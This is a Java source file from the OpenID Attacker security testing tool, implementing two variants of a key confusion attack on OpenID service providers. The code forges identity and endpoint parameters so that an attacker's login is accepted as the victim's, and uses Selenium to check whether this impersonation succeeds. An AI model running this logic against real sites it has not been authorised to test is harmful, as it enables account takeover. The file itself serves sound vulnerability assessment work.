/*
 * OpenID Attacker
 * (C) 2015 Christian Mainka & Christian Koßmann
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.sso.openid.attacker.evaluation.attack;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import org.apache.commons.collections.CollectionUtils;
import org.openqa.selenium.By;
import org.openqa.selenium.JavascriptExecutor;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import wsattacker.sso.openid.attacker.attack.parameter.AttackParameter;
import wsattacker.sso.openid.attacker.attack.parameter.utilities.HttpMethod;
import wsattacker.sso.openid.attacker.config.OpenIdServerConfiguration;
import wsattacker.sso.openid.attacker.evaluation.LoginResult;
import wsattacker.sso.openid.attacker.evaluation.SeleniumBrowser;
import wsattacker.sso.openid.attacker.evaluation.ServiceProvider;
import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult.Interpretation;
import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult.Result;
import wsattacker.sso.openid.attacker.evaluation.ServiceProvider.User;
import wsattacker.sso.openid.attacker.log.RequestLogEntry;
import wsattacker.sso.openid.attacker.log.RequestLogger;

public class KeyConfusionAttack extends AbstractAttack {
    
    private boolean analyzerIdpGetMethod;
    private boolean attackerIdpGetMethod;

    public KeyConfusionAttack(ServiceProvider serviceProvider) {
        super(serviceProvider);
    }

    @Override
    protected void beforeAttack() {
        super.beforeAttack();
        
        attackerIdpGetMethod = OpenIdServerConfiguration.getAttackerInstance().isMethodGet();
        analyzerIdpGetMethod = OpenIdServerConfiguration.getAnalyzerInstance().isMethodGet();
        
        // restart browser to remove all Cookies
        //SeleniumBrowser.quitWebDriver();
        
    }

    @Override
    protected void afterAttack() {
        super.afterAttack();
        
        OpenIdServerConfiguration.getAttackerInstance().setInterceptIdPResponse(false);        
        OpenIdServerConfiguration.getAnalyzerInstance().setInterceptIdPResponse(false); 
        
        OpenIdServerConfiguration.getAttackerInstance().setMethodGet(attackerIdpGetMethod);
        OpenIdServerConfiguration.getAnalyzerInstance().setMethodGet(analyzerIdpGetMethod);
    }
    
    @Attack(number = 0)
    private AttackResult performFirstVariantOfKeyConfusionAttack() {
        OpenIdServerConfiguration.getAttackerInstance().setPerformAttack(true);
        //OpenIdServerConfiguration.getAttackerInstance().setMethodGet(true);
        
        String victimIdp = OpenIdServerConfiguration.getAnalyzerInstance().getXrdsConfiguration().getBaseUrl();
        
        AttackParameter opEndpointParameter = keeper.getParameter("openid.op_endpoint");
        opEndpointParameter.setAttackValueUsedForSignatureComputation(true);
        opEndpointParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        opEndpointParameter.setAttackMethod(HttpMethod.GET);
        opEndpointParameter.setAttackValue(victimIdp);
        
        String victimIdentity = OpenIdServerConfiguration.getAnalyzerInstance().getXrdsConfiguration().getIdentity();
        
        AttackParameter claimedIdParameter = keeper.getParameter("openid.claimed_id");
        claimedIdParameter.setAttackValueUsedForSignatureComputation(true);
        claimedIdParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        claimedIdParameter.setAttackMethod(HttpMethod.GET);
        claimedIdParameter.setAttackValue(victimIdentity);
        
        AttackParameter identityParameter = keeper.getParameter("openid.identity");
        identityParameter.setAttackValueUsedForSignatureComputation(true);
        identityParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        identityParameter.setAttackMethod(HttpMethod.GET);
        identityParameter.setAttackValue(victimIdentity);
        
        // include modified parameter in signature
        AttackParameter sigParameter = keeper.getParameter("openid.sig");
        sigParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        sigParameter.setAttackMethod(HttpMethod.GET);
        
        LoginResult loginResult = serviceProvider.login(ServiceProvider.User.ATTACKER);
        
        boolean success = serviceProvider.determineAuthenticatedUser(loginResult.getPageSource(), loginResult.getUrlAfterLogin()) == User.VICTIM;
        Result result = success ? Result.SUCCESS : Result.FAILURE;
        Interpretation interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;
        
        if (loginResult.hasDirectVerification()) {
            result = Result.NOT_PERFORMABLE;
            interpretation = Interpretation.NEUTRAL;
        }
        
        assert isSignatureValid(loginResult) : "Signature is not valid!";
        
        return new AttackResult("First variant of Key Confusion", loginResult, result, interpretation);
    }

    @Attack(number = 1)
    private AttackResult performSecondVariantOfKeyConfusionAttack() {
        OpenIdServerConfiguration.getAttackerInstance().setInterceptIdPResponse(true);
        OpenIdServerConfiguration.getAttackerInstance().setMethodGet(false);
        
        OpenIdServerConfiguration.getAnalyzerInstance().setInterceptIdPResponse(true);
        OpenIdServerConfiguration.getAnalyzerInstance().setMethodGet(false);        
        
        OpenIdServerConfiguration.getAttackerInstance().setPerformAttack(true);
        
        
        String victimIdp = OpenIdServerConfiguration.getAnalyzerInstance().getXrdsConfiguration().getBaseUrl();
        
        AttackParameter opEndpointParameter = keeper.getParameter("openid.op_endpoint");
        opEndpointParameter.setAttackValueUsedForSignatureComputation(true);
        opEndpointParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        opEndpointParameter.setAttackMethod(HttpMethod.GET);
        opEndpointParameter.setAttackValue(victimIdp);
        
        String victimIdentity = OpenIdServerConfiguration.getAnalyzerInstance().getXrdsConfiguration().getIdentity();
        
        AttackParameter claimedIdParameter = keeper.getParameter("openid.claimed_id");
        claimedIdParameter.setAttackValueUsedForSignatureComputation(true);
        claimedIdParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        claimedIdParameter.setAttackMethod(HttpMethod.GET);
        claimedIdParameter.setAttackValue(victimIdentity);
        
        AttackParameter identityParameter = keeper.getParameter("openid.identity");
        identityParameter.setAttackValueUsedForSignatureComputation(true);
        identityParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        identityParameter.setAttackMethod(HttpMethod.GET);
        identityParameter.setAttackValue(victimIdentity);
        
        // include modified parameter in signature
        AttackParameter sigParameter = keeper.getParameter("openid.sig");
        sigParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        sigParameter.setAttackMethod(HttpMethod.GET);
        
        // copy log entries before login
        List<RequestLogEntry> logEntriesBeforeLogin = new ArrayList<>(RequestLogger.getInstance().getEntryList());
        
        LoginResult loginResultAttacker = serviceProvider.login(ServiceProvider.User.ATTACKER);
        
        WebDriver driver = SeleniumBrowser.getWebDriver();
        JavascriptExecutor jse = (JavascriptExecutor)driver;
        String url = serviceProvider.getUrl();
        jse.executeScript("var win = window.open('" + url + "');");
        
        List<String> windowhandles = new ArrayList<>(driver.getWindowHandles());
        driver.switchTo().window(windowhandles.get(1));
        
        LoginResult loginResultVictim = serviceProvider.login(ServiceProvider.User.VICTIM);
        
        driver.switchTo().window(windowhandles.get(0));
        
        List<WebElement> links = driver.findElements(By.tagName("a"));
        links.get(1).click();
        
        /* determines the log entries of the current login procedure:
           logEntries = logEntriesAfterLogin - logEntriesBeforeLogin
           (subtraction of sets) */
        List<RequestLogEntry> logEntriesAfterLogin = RequestLogger.getInstance().getEntryList();
        List<RequestLogEntry> logEntries = (List<RequestLogEntry>) CollectionUtils.subtract(logEntriesAfterLogin, logEntriesBeforeLogin);
        
        // invert order of log - should be chronological
        Collections.reverse(logEntries);
        
        loginResultAttacker.setScreenshot(SeleniumBrowser.takeScreenshot());
        loginResultAttacker.setLogEntries(logEntries);
        
        boolean success = serviceProvider.determineAuthenticatedUser(driver.getPageSource(), driver.getCurrentUrl()) == User.VICTIM;
        Result result = success ? Result.SUCCESS : Result.FAILURE;
        Interpretation interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED; 
        
        if (loginResultAttacker.hasDirectVerification()) {
            result = Result.NOT_PERFORMABLE;
            interpretation = Interpretation.NEUTRAL;
        }
        
        assert isSignatureValid(loginResultAttacker) : "Signature is not valid!";
        
        // close second window
        driver.switchTo().window(windowhandles.get(1)).close();
        driver.switchTo().window(windowhandles.get(0));
        
        return new AttackResult("Second Variant of Key Confusion", loginResultAttacker, result, interpretation);
    }
}
